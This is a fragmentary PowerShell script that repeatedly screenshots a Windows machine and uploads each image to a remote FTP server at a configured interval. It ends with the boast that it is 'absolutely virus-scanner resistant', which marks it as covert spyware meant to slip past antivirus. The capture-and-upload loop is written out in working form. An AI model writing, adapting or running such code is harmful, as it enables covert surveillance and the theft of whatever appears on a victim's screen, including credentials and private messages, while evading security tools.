Function Take-ScreenShot
{
    ...
    Param (
        ...
        [Parameter(
                   ...
                   ParameterSetName = "",
                   ValueFromPipeline = $False)]
        [string][ValidateSet("bmp", "jpeg", "png")]
        $imagetype = "bmp",
        [Parameter(
                   Mandatory = $False,
                   ParameterSetName = "",
...
'@
    #Use Add-Type to import the code
...
do
{
    $interval = (cat c:\Programme\screentoftp\interval.txt)
    $jpegpathlocal = (cat c:\Programme\screentoftp\local.txt)
    $jpegpathftp = (cat c:\Programme\screentoftp\ftp.txt)
    Take-ScreenShot -screen -imagetype jpeg -file $jpegpathlocal
    #Create FTP Client Object
    $webclient = New-Object -TypeName System.Net.WebClient
    $uri = New-Object -TypeName System.Uri -ArgumentList $jpegpathftp
    #Uploads the Picture to the FTP Server
    $webclient.UploadFile($uri, $jpegpathlocal)
    Start-Sleep -Seconds $interval
}
while($loop -eq "1")

abosult virenscanner resistent ;)
